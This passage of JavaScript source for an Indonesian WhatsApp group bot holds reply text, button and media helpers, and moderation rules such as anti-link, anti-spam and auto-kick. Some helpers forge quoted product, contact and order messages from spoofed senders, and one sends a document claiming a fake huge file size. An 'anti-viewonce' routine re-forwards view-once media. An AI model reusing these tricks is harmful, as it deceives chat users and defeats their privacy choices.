                    ikyc.sendMessage(from, `@${sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, text, {contextInfo:{mentionedJid:[sender]}})
                }
            }
 //******************* 》MESSGAGE RESPON《 ********************\\
mess = {
wait: `[ ‼️ ] 𝘏𝘢𝘳𝘢𝘱 𝘛𝘶𝘯𝘨𝘨𝘶 𝘚𝘦𝘣𝘦𝘯𝘵𝘢𝘳.. 𝘒𝘢𝘬 \n\n[══━━━━✥𝘿𝙀𝙏𝘼𝙄𝙇✥━━━━══]\n✜ 𝘠𝘢𝘯𝘨 𝘙𝘦𝘲𝘶𝘦𝘴𝘵 ➣ ${pushname} \n✜ 𝘊𝘰𝘮𝘮𝘢𝘯𝘥 𝘙𝘦𝘲𝘶𝘦𝘴𝘵 ➣ : ${command} \n✜ 𝘋𝘪𝘮𝘪𝘯𝘵𝘢 𝘗𝘢𝘥𝘢 𝘑𝘢𝘮 ➣ ${timeWib}`,
search: 'Searching...',
admin: 'Kusus admin, Cek Admin',
owner: 'Khusus Owner, Cek Owner',
success: 'Success Fully',
limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
eror: 'Eror To Again',
claimOnAlready: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi di esok hari.`,
wrongFormat: 'Format salah, coba liat lagi di menu',
error: {
stick: 'bukan sticker itu:v',
api: 'Error api atau linkya mungkin',
Iv: 'Linknya error:v'
},
only: {
prem : 'Premium special features! Chat owner to get Premium access!',
group: 'Fitur Dapat digunakan di Dalam Group!',
ownerG: 'Fitur Dapat digunakan oleh Owner Group!',
ownerB: 'Fitur Khusus Owner Bot!',
admin: 'Fitur dapat Digunakan oleh Admin Group!',
Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
 }
 }
                    
if(timeWib < "23:59:00"){
var ucapanWaktu = 'Selamat malam'
                                        }
if(timeWib < "19:00:00"){
var ucapanWaktu = 'Selamat malam'
                                         }
if(timeWib < "18:00:00"){
var ucapanWaktu = 'Selamat sore'
                                         }
if(timeWib < "15:00:00"){
var ucapanWaktu = 'Selamat siang'
                                         }
if(timeWib < "11:00:00"){
var ucapanWaktu = 'Selamat pagi'
                                         }
if(timeWib < "06:00:00"){
var ucapanWaktu = 'Selamat pagi'  }      
        

  var elit = 'Petualang Biasa'
			if (isPremium) {
				elit = 'Petualang Pro'
			} 
			if (isOwner) {
				elit = 'GM in GAME'
			}

//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`, "retailerId": `Rp.10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}

//Set Quoted
if(fakeToko){
var setQuoted = ftoko
} else if(fakeKontak){
var setQuoted = fkontak
} else if(fakeTeks){
var setQuoted = ftext
}else if(fakeTroli){
var setQuoted = ftroli
} else {
var setQuoted = iky
}
//SetReply
const setReply = async(teks) =>{
if(setWeb){
ikyc.sendMessage(from, teks, text, { quoted: iky, contextInfo: { forward, externalAdReply:{title: `${fake}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`http://wa.me/${Ownerin.split("@")[0]}`}}})
} else if(setTroli){
var yakult = ikyc.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': iky,
'contextInfo': forward
});
ikyc.relayWAMessage(yakult)  
} else if(setMessage){
ikyc.sendMessage(from, teks, text, { quoted: iky });
} else if(setVideo){
ikyc.sendMessage(from, teks, text, { quoted: iky, contextInfo: { forward, externalAdReply:{title: fake,mediaType:"2", thumbnail: fs.readFileSync('./stik/fake.jpeg'), mediaUrl:`https://youtu.be/uQiF1yOnzDg`}}})
} 
}
           
const sendKontak = (from, nomor, nama, org = "") => {
const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
ikyc.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: iky });
}

//******************* 》BUTTON CMD《 ********************\\

const sendButton = async (from, context, fortext, but, iky) => {
        buttonMessages = {
        contentText: context,
        footerText: fortext,
        buttons: but,
        headerType: 1
        }
        ikyc.sendMessage(from, buttonMessages, buttonsMessage, {
        quoted: iky
        })
        } 
///Button Text
const sendButMessage = (id, text1, desc1, but = []) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
ikyc.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: setQuoted})
}

///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ikyc.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText:  text1,
footerText: desc1,
buttons: but,
headerType: 4
}
ikyc.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await ikyc.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
ikyc.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

//Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ikyc.prepareMessage(id, {jpegThumbnail: kma}, MessageType.location)
buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 'LOCATION',
}
ikyc.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
						
//Button document
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
await ikyc.sendMessage(id, { 
contentText: text1, 
footerText: desc1,
buttons: but, 
"headerType": "DOCUMENT", 
"documentMessage": { 
"url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc", 
"mimetype": "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
"title": "Footer text", 
"fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=", 
"fileLength": 999999999999, 
"pageCount": 100, 
"mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=", 
"fileName": namaDocument, 
"fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=", 
"directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC", 
"mediaKeyTimestamp": "1634472176", 
"jpegThumbnail": gam1}}, 
MessageType.buttonsMessage, options)
}
//Katalog menu
const sendKatalog = async (deskripsi ) => {   
hmm4 = fs.readFileSync('./stik/thumb.jpeg')
imeu =   await ikyc.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
imeg = imeu.message.imageMessage
res =   ikyc.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': 'IDR',
'title': fake,
'description': deskripsi,
'retailerId': copyright,
'itemCount': jumlahTroli,
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
}
}, {
contextInfo: forward,
quoted: setQuoted
 }), 
 ikyc.relayWAMessage(res)         
}
const hideTag = async function(from, text){
	       let anu = await ikyc.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       ikyc.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('stik/bot.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
const sendiky = async (deskripsi ) => {   
hmm4 = fs.readFileSync('./stik/thumb.jpeg')
imeu =   await ikyc.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
imeg = imeu.message.imageMessage
res =   ikyc.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': 'IDR',
'title': fake,
'description': deskripsi,
'retailerId': copyright,
'itemCount': jumlahTroli,
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
}
}, {
contextInfo: forward,
quoted: setQuoted
 }), 
 ikyc.relayWAMessage(res)         
}

//Troli menu
const sendTroli = async (deskripsi ) => {
var sendnih = ikyc.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':deskripsi,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted,
'contextInfo': forward,
});
ikyc.relayWAMessage(sendnih)    
}

//SendBc
const sendBc = async(id, text1, desc1, gam1, but = [], options = {}) => {	
if(bcDokumen) {
Sendbutdocument(id, text1,desc1,gam1, but, options)
 } else  if(bcLokasi) {  
sendButLocation(id, text1,desc1,fs.readFileSync('./stik/fake.jpeg'), but, options)
} else if(bcTroli) {
sendButMessage(id, text1, desc1, but)
} else {
ikyc.sendMessage(id, `${text1}\n\n${desc1}`, text)
}
}

//onlyOwner
const onlyOwner = async() =>{
if(autovn){
sendvn(gakmau)
}else if(autosticker){
sendSticker(gaboleh)
} else if(typing){
setReply(mess.owner)
}else {
setReply(mess.owner)
}
}


        const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🍒 : 🍒 : 🍒 Win👑',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🔔 : 🔔 : 🔔 Win👑',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔','🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇 Win👑','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',	'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐 Win👑','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🍒 : 🍒 : 🍒 Win👑','🍌 : 🍌 : 🍌 Win👑']


//no
	var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 1: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 2: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 3: jamss = "Dah Mau Shubuh Siap Siap Shalat Ya 🌔"; break;
                case 4: jamss = "Dah Shubuh Jangan Lupa Shalat Kak🌔"; break;
                case 5: jamss = "Pagi 🌄"; break;
                case 6: jamss = "Pagi 🌄"; break;
                case 7: jamss = "Pagi 🌄"; break;
                case 8: jamss = "Pagi ☀️"; break;
                case 9: jamss = "Pagi ☀️"; break;
                case 10: jamss = "Pagi ☀️"; break;
                case 11: jamss = "Siang 🌞"; break;
                case 12: jamss = "Udh Dzuhur  Jangan Lupa Shalat Kak 🌞"; break;
                case 13: jamss = "Siang 🌞"; break;
                case 14: jamss = "Siang 🌞"; break;
                case 15: jamss = "Dah Ashar Jangan Lupa Shalat kak🌞"; break;
                case 16: jamss = "Sore ☀️"; break;
                case 17: jamss = "Sore 🌄"; break;
                case 18: jamss = "Dah Maghrib Jangan Lupa Shalat Kak 🌄"; break;
                case 19: jamss = "Malam 🌃 🌙"; break;
                case 20: jamss = "Malam 🌃 🌙"; break;
                case 21: jamss = "Malam 🌃 🌙"; break;
                case 22: jamss = "Dah Malam Jangan Gadang 🌉🌙"; break;
                case 23: jamss = "Dah Malam Jangan Gadang 🌚"; break;
            }         
                               
var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 kurruari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
// TROLI
runtime = process.uptime()
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 1234567,
                            status: 1,
                            surface : 1,
                            message: `Selamat ${tampilUcapan}`, //Kasih namalu
                            orderTitle: `IKYYY v.3.0`,
                            thumbnail: thumb, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }		
const fhidetag = {key : {fromMe:false, //by Guntur
	participant : '0@s.whatsapp.net'},
       message: {
              orderMessage: {
                            itemCount : 100,
                            status: 1,
                            surface : 1,
                            message: `Pesan Dari\n${pushname}`, 
                            orderTitle: `Banh?`,
                            thumbnail: thumb, 
                            sellerJid: '0@s.whatsapp.net',
                            contextInfo: {"forwardingScore":999,"isForwarded":true}, sendEphemeral: true}}}



//******************* 》FAKE MESSAGE《 ********************\\

      
const sendvn = (teks) => {
ikyc.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: iky, ptt: true})
}     
const reply = (teks) => {
ikyc.sendMessage(from, teks, text, { quoted: iky });
};
const sendMess = (teks) => {
ikyc.sendMessage(from, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? ikyc.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: iky, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
}

const costum = (pesan) => {
if(Loading){
ikyc.sendMessage(from, pesan, text, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*${fake}*`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}})
} 
}

const sendSticker = (pesan) => {
ikyc.sendMessage(from, pesan, sticker, {quoted: iky, contextInfo: forward})
}
const sendSticker1 = (pesan) => {
ikyc.sendMessage(from, pesan, sticker)
}
const math = (teks) => {
return Math.floor(teks)
}  
        
        
//HARI HARI                    
	var dates = moment().tz('Asia/Jakarta').format("YYYY-MM-DDTHH:mm:ss");
        var date = new Date(dates);
        var tahun = date.getFullYear();
        var bulan = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
       
        switch(hari) {
            case 0: hari = "Minggu"; break;
            case 1: hari = "Senin"; break;
            case 2: hari = "Selasa"; break;
            case 3: hari = "Rabu"; break;
            case 4: hari = "Kamis"; break;
            case 5: hari = "Jum`at"; break;
            case 6: hari = "Sabtu"; break;
        }
		switch(bulan) {
            case 0: bulan = "Januari"; break;
            case 1: bulan = "Februari"; break;
            case 2: bulan = "Maret"; break;
            case 3: bulan = "April"; break;
            case 4: bulan = "Mei"; break;
            case 5: bulan = "Juni"; break;
            case 6: bulan = "Juli"; break;
            case 7: bulan = "Agustus"; break;
            case 8: bulan = "September"; break;
            case 9: bulan = "Oktober"; break;
            case 10: bulan = "November"; break;
            case 11: bulan = "Desember"; break;
        }
			const Tanggals = "" + hari + ", " + tanggal + " " + bulan + " " + tahun;
			const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss z')			
        const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			} 
                
 


//******************* 》FUNCTION《 ********************\\

const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
ikyc.sendMessage(to, media, sticker,{quoted:iky})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
            
           
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
ikyc.sendMessage(to, media, type, { quoted: iky, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
fs.unlinkSync(filename)
});
}

const sendFileFromUrl = async(link, type, options) => {         
hasil = await getBuffer(link)
await ikyc.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
ikyc.sendMessage(from, hasil, type, options).catch(e => {
ikyc.sendMessage(from, { url : link }, type, options).catch(e => {
setReply("_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_")
console.log(e)
})
})
})
})
}

const sendWebp = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}

const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
ikyc.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
ikyc.sendMessage(from, hasil, type, options).catch(e => {
ikyc.sendMessage(from, { url : link }, type, options).catch(e => {
setReply('Error!')
console.log(e)
})
})
})
})
}            
   
const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('./lib/exif.js')
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif.js ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
ikyc.sendMessage(to, media, sticker, iky)
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
fs.unlinkSync(names)
fs.unlinkSync(namea)
});
});
});
}
//CMD BUTTON FUNCTION
selectedButton = (type == 'buttonsResponseMessage') ? iky.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? iky.message.listResponseMessage.title : ''
                          
            
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
if (!iky.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
setReply(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
var msg = { ...iky };
msg.iky = iky.message.viewOnceMessage.message;
msg.iky[Object.keys(msg.iky)[0]].viewOnce = false;
ikyc.copyNForward(m.chat, msg);
}
 
//ANTI HIDETAGG
if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
if (isGroupAdmins) return setReply('Admin bebas pakai hidetag dong :v')
console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
setReply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
setTimeout(() => {
ikyc.groupRemove(from, [sender]);
},3000)
}       
//ANTI BADWORD 
if (isGroup && Toxic && !isOwner && !isGroupAdmins && !iky.key.fromMe){ 
if (badword.includes(messagesC)) {
if (isCountKasar(sender, senbadword)){
if (!isBotGroupAdmins) return setReply(`Kamu beruntung karena bot bukan admin`)
setReply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
setTimeout( () => {
ikyc.groupRemove(from, [sender])
},1000)
delCountKasar(sender, senbadword)
} else {
addCountKasar(sender, senbadword)
setReply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
}
}
}
           
//ANTI VIRUS
if (isGroup && AntiVirtex && budy.length > 8000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await ikyc.modifyChat(m.chat, 'delete', { includeStarred: false })
await ikyc.sendMessage(from, antivirus(pushname,groupName), text)
if (!isBotGroupAdmins) return 
if(isOwner) return 
await ikyc.groupRemove(from, [sender])
await ikyc.groupSettingChange(from, GroupSettingChange.messageSend, true)
await sendMess("Group Telah Di Tutup")
await sendMess(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
 }
    
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await ikyc.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
ikyc.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
} 
 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await ikyc.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
ikyc.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}


//******************* 》FUNCTION OTHERS《 ********************\\

// MUTE
if (isMuted ){
if (!isOwner && !theOwner) return
}
   
//BOT FUNCTION
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
 
//VOTING FUNCTION
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
 }  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}
//PUBLIC
if (publik === false) {
if (!iky.key.fromMe && !isOwner && !theOwner) return
}

//BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner && !isGroupAdmins) return
}

if(isBanned && !isOwner) return
if(isSpamBan) return
SpamExpired(spamBan)
SpammerExpired(spamkuyy)


//ANTI SPAM
if (isCmd && msgFilter.isFiltered(from) && !isGroup && !iky.key.fromMe && !isOwner) {
if(cekSpam(sender, spamBan)) return
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
addSpam(sender, "30s", spamBan)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
if(autovn) return sendvn(nospam)
return setReply(textspam)
}
//ANTIWAME  
if (budy.includes("wa.me/","https://wa.me//","https://wa.me/")) {
        	if (!iky.key.fromMe){
				if (!isGroup) return
				if (!isAntiWame) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				ikyc.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Wa.me terdeteksi Auto kick!')
			    ikyc.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
            }
        }	   
        //ANTIWAME  
if (budy.includes("🗿","🪨","🧊")) {
        	if (!iky.key.fromMe){
				if (!isGroup) return
				if (!isAntiBatu) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				ikyc.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Batu terdeteksi Auto kick!')
			    ikyc.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
            }
        }
